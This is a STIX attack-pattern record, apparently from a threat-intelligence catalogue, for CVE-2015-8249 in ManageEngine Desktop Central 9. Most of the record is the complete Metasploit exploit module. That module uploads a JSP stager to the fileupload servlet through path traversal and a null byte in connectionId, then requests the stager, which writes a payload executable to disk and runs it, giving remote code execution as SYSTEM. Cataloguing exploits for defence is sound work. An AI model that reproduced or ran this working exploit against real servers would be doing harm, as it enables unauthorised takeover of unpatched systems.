{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c290a5f1-0f21-416e-93bf-ebd3494c4dbc",
    "created": "2024-08-14T16:55:27.382289Z",
    "modified": "2024-08-14T16:55:27.382293Z",
    "name": "\"ManageEngine Desktop Central 9 FileUploadServlet ConnectionId Vulnerability\"",
    "description": " This module exploits a vulnerability found in ManageEngine Desktop Central 9. When uploading a 7z file, the FileUploadServlet class does not check the user-controlled ConnectionId parameter in the FileUploadServlet class. This allows a remote attacker to inject a null bye at the end of the value to create a malicious file with an arbitrary file type, and then place it under a directory that allows server-side scripts to run which results in remote code execution under the context of SYSTEM.  Please note that by default, some ManageEngine Desktop Central versions run on port 8020 but older ones run on port 8040. Also, using this exploit will leave debugging information produced by FileUploadServlet in file rdslog0.txt.  This exploit was successfully tested on version 9, build 90109 and build 91084.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/manageengine_connectionid_write.rb",
            "external_id": "manageengine_connectionid_write.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2015/12/14/r7-2015-22-manageengine-desktop-central-9-fileuploadservlet-connectionid-vulnerability-cve-2015-8249"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-8249"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'nokogiri'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"ManageEngine Desktop Central 9 FileUploadServlet ConnectionId Vulnerability\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in ManageEngine Desktop Central 9. When\n        uploading a 7z file, the FileUploadServlet class does not check the user-controlled\n        ConnectionId parameter in the FileUploadServlet class. This allows a remote attacker to\n        inject a null bye at the end of the value to create a malicious file with an arbitrary\n        file type, and then place it under a directory that allows server-side scripts to run,\n        which results in remote code execution under the context of SYSTEM.\n\n        Please note that by default, some ManageEngine Desktop Central versions run on port 8020,\n        but older ones run on port 8040. Also, using this exploit will leave debugging information\n        produced by FileUploadServlet in file rdslog0.txt.\n\n        This exploit was successfully tested on version 9, build 90109 and build 91084.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'sinn3r' ],\n      'References'     =>\n        [\n          [ 'URL', 'https://www.rapid7.com/blog/post/2015/12/14/r7-2015-22-manageengine-desktop-central-9-fileuploadservlet-connectionid-vulnerability-cve-2015-8249' ],\n          [ 'CVE', '2015-8249']\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'ManageEngine Desktop Central 9 on Windows', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2015-12-14',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path for ManageEngine Desktop Central', '/']),\n        Opt::RPORT(8020)\n      ])\n  end\n\n  def jsp_drop_bin(bin_data, output_file)\n    jspraw =  %Q|<%@ page import=\"java.io.*\" %>\\n|\n    jspraw << %Q|<%\\n|\n    jspraw << %Q|String data = \"#{Rex::Text.to_hex(bin_data, \"\")}\";\\n|\n\n    jspraw << %Q|FileOutputStream outputstream = new FileOutputStream(\"#{output_file}\");\\n|\n\n    jspraw << %Q|int numbytes = data.length();\\n|\n\n    jspraw << %Q|byte[] bytes = new byte[numbytes/2];\\n|\n    jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\\n|\n    jspraw << %Q|{\\n|\n    jspraw << %Q|  char char1 = (char) data.charAt(counter);\\n|\n    jspraw << %Q|  char char2 = (char) data.charAt(counter + 1);\\n|\n    jspraw << %Q|  int comb = Character.digit(char1, 16) & 0xff;\\n|\n    jspraw << %Q|  comb <<= 4;\\n|\n    jspraw << %Q|  comb += Character.digit(char2, 16) & 0xff;\\n|\n    jspraw << %Q|  bytes[counter/2] = (byte)comb;\\n|\n    jspraw << %Q|}\\n|\n\n    jspraw << %Q|outputstream.write(bytes);\\n|\n    jspraw << %Q|outputstream.close();\\n|\n    jspraw << %Q|%>\\n|\n\n    jspraw\n  end\n\n  def jsp_execute_command(command)\n    jspraw =  %Q|<%@ page import=\"java.io.*\" %>\\n|\n    jspraw << %Q|<%\\n|\n    jspraw << %Q|try {\\n|\n    jspraw << %Q|  Runtime.getRuntime().exec(\"chmod +x #{command}\");\\n|\n    jspraw << %Q|} catch (IOException ioe) { }\\n|\n    jspraw << %Q|Runtime.getRuntime().exec(\"#{command}\");\\n|\n    jspraw << %Q|%>\\n|\n\n    jspraw\n  end\n\n  def get_jsp_stager\n    exe = generate_payload_exe(code: payload.encoded)\n    jsp_fname = \"#{Rex::Text.rand_text_alpha(5)}.jsp\"\n    # pwd: C:\\ManageEngine\\DesktopCentral_Server\\bin\n    # targeted location: C:\\ManageEngine\\DesktopCentral_Server\\webapps\\DesktopCentral\\jspf\n    register_files_for_cleanup(\"../webapps/DesktopCentral/jspf/#{jsp_fname}\")\n\n    {\n      jsp_payload: jsp_drop_bin(exe, jsp_fname) + jsp_execute_command(jsp_fname),\n      jsp_name:    jsp_fname\n    }\n  end\n\n  def get_build_number(res)\n    inputs = res.get_hidden_inputs\n    # The buildNum input is in the first form\n    inputs.first['buildNum']\n  end\n\n  def get_html_title(res)\n    html = res.body\n    n = ::Nokogiri::HTML(html)\n    n.at_xpath('//title').text\n  end\n\n  def check\n    uri = normalize_uri(target_uri.path, '/configurations.do')\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => uri\n    })\n\n    unless res\n      vprint_error(\"Connection timed out\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    build_number = get_build_number(res)\n    vprint_status(\"Found build number: #{build_number}\")\n\n    html_title   = get_html_title(res)\n    vprint_status(\"Found title: #{html_title}\")\n\n    if build_number <= '91084'\n      return Exploit::CheckCode::Appears\n    elsif /ManageEngine Desktop Central/ === html_title\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def upload_jsp(stager_info)\n    # connectionId is part of the 7z filename\n    # computerName is part of the 7z filename (but will be used due to the null byte injection)\n    # customerId is used as a directory name\n    #\n    # The intended upload path is:\n    # C:\\ManageEngine\\DesktopCentral_Server\\webapps\\DesktopCentral\\server-data\\[customerId]\\rds\\scr-rec\\null-computerName-connectionId.7z\n    # But this will upload to:\n    # C:\\ManageEngine\\DesktopCentral_Server\\webapps\\DesktopCentral\\jspf\n\n    uri = normalize_uri(target_uri.path, 'fileupload')\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => uri,\n      'ctype'    => 'application/octet-stream',\n      'encode_params' => false,\n      'data'     => stager_info[:jsp_payload],\n      'vars_get' => {\n        'connectionId' => \"#{Rex::Text.rand_text_alpha(1)}/../../../../../jspf/#{stager_info[:jsp_name]}%00\",\n        'resourceId'   => Rex::Text.rand_text_alpha(1),\n        'action'       => 'rds_file_upload',\n        'computerName' => Rex::Text.rand_text_alpha(rand(10)+5),\n        'customerId'   => Rex::Text.rand_text_numeric(rand(10)+5)\n      }\n    })\n\n    if res.nil?\n      fail_with(Failure::Unknown, \"Connection timed out while uploading to #{uri}\")\n    elsif res && res.code != 200\n      fail_with(Failure::Unknown, \"The server returned #{res.code}, but 200 was expected.\")\n    end\n  end\n\n  def exec_jsp(stager_info)\n    uri = normalize_uri(target_uri.path, \"/jspf/#{stager_info[:jsp_name]}\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => uri\n    })\n\n    if res.nil?\n      fail_with(Failure::Unknown, \"Connection timed out while executing #{uri}\")\n    elsif res && res.code != 200\n      fail_with(Failure::Unknown, \"Failed to execute #{uri}. Server returned #{res.code}\")\n    end\n  end\n\n  def exploit\n    print_status(\"Creating JSP stager\")\n    stager_info = get_jsp_stager\n\n    print_status(\"Uploading JSP stager #{stager_info[:jsp_name]}...\")\n    upload_jsp(stager_info)\n\n    print_status(\"Executing stager...\")\n    exec_jsp(stager_info)\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2015-12-14",
    "x_mitre_platforms": [
        "win'"
    ]
}